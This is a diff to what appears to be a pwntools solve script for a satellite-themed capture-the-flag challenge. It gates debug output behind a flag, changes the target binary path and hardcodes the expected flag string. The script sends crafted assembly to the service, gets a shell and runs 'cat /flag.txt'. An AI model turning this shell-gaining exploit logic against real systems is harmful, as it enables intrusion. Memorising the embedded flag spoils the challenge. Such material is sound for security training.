@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('../source/build/shift_satellite')
+exe = context.binary = ELF('../server')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -58,6 +58,7 @@ import math
 import numpy as np
 
 FLAG = "magpie{1'v3-c0nn3c+3d-t43-d0ts}"
+OUTPUT = "output" in sys.argv
 
 class Satellite:
     ARG_MAP = {
@@ -115,7 +116,7 @@ class Satellite:
                 (next_sat.position['z'] - self.position['z'])
              ) * 180 / math.pi - self.theta['z'] + 360
 
-        sys.stderr.write(f"desired changes: {dx}, {dy}. {dz}\n")
+        if(OUTPUT): sys.stderr.write(f"desired changes: {dx}, {dy}. {dz}\n")
 
         dx_hex = hex(int.from_bytes(np.array([dx], '>f2').tobytes(), "big"))
         dy_hex = hex(int.from_bytes(np.array([dy], '>f2').tobytes(), "big"))
@@ -131,7 +132,7 @@ ori     $dz $dz 0x{dz_hex[4:6]}""", 'ascii')
     def assemble_asm(instructions:bytes) -> bytes:
         machine_code = b""
 
-        sys.stderr.write(f"assembling the following assembly:\n{instructions.decode('ascii')}\n")
+        if(OUTPUT): sys.stderr.write(f"assembling the following assembly:\n{instructions.decode('ascii')}\n")
 
         for line in instructions.split(b'\n'):
             # remove comments (after ';')
@@ -139,7 +140,7 @@ ori     $dz $dz 0x{dz_hex[4:6]}""", 'ascii')
             # split across whitespaces
             instr_parts = line.split()
 
-            print(line, instr_parts)
+            if(OUTPUT): print(line, instr_parts)
 
             instr_int = 0
             # set the argument
@@ -157,8 +158,8 @@ ori     $dz $dz 0x{dz_hex[4:6]}""", 'ascii')
                 else:
                     immediate = int(instr_parts[3])
             except Exception as e:
-                sys.stderr.write("immediate value is not valid :(")
-                sys.stderr.write(e)
+                if(OUTPUT): sys.stderr.write("immediate value is not valid :(")
+                if(OUTPUT): sys.stderr.write(e)
                 exit(-1)
 
             instr_int = instr_int << 8 | immediate
@@ -253,13 +254,13 @@ def solve() -> bool:
     # sys.stderr.buffer.write(grid + b'\n')
     parse_grid(satellites, grid) # x, z
 
-    sys.stderr.write("[info] received satellite information:\n")
+    if(OUTPUT): sys.stderr.write("[info] received satellite information:\n")
     for symbol in satellites.keys():
         io.send(b"STAT:" + bytes(symbol, 'ascii'))
         io.recvuntil(b"theta_")
         angle_line = io.recvuntil(b'\n')
         parse_angle(symbol, satellites, angle_line)
-        sys.stderr.write(f"{satellites[symbol]}\n")
+        if(OUTPUT): sys.stderr.write(f"{satellites[symbol]}\n")
 
     for index, symbol in enumerate(satellites.keys()):
         if index >= len(satellites.keys()) - 1: break
@@ -271,10 +272,10 @@ def solve() -> bool:
         io.send(b'\n') # send newline to end communication
         io.recvuntil(b"satellite response: ")
         confirm = io.recvuntil(b'\n')
-        sys.stderr.write(confirm.decode('ascii'))
+        if(OUTPUT): sys.stderr.write(confirm.decode('ascii'))
 
         if b"ABRT_SEGFAULT" in confirm:
-            sys.stderr.write(f"[err] bad bad bad, instructions did not work :(")
+            if(OUTPUT): sys.stderr.write(f"[err] bad bad bad, instructions did not work :(")
             return False
 
     # get shell
@@ -283,7 +284,7 @@ def solve() -> bool:
     io.recvuntil(b'satellite response ')
     shell_stat = io.recvuntil(b'\n')
 
-    print(shell_stat)
+    if(OUTPUT): print(shell_stat)
     if b"CONN_FAILED" in shell_stat: return False
 
     io.recvuntil(b"process\n")
@@ -291,7 +292,7 @@ def solve() -> bool:
     io.send(b"cat /flag.txt\n")
     flag_output = io.recvuntil(b'}').decode('ascii')
 
-    sys.stderr.write(flag_output + "\n\n")
+    if(OUTPUT): sys.stderr.write(flag_output + "\n\n")
 
     return FLAG in flag_output
 
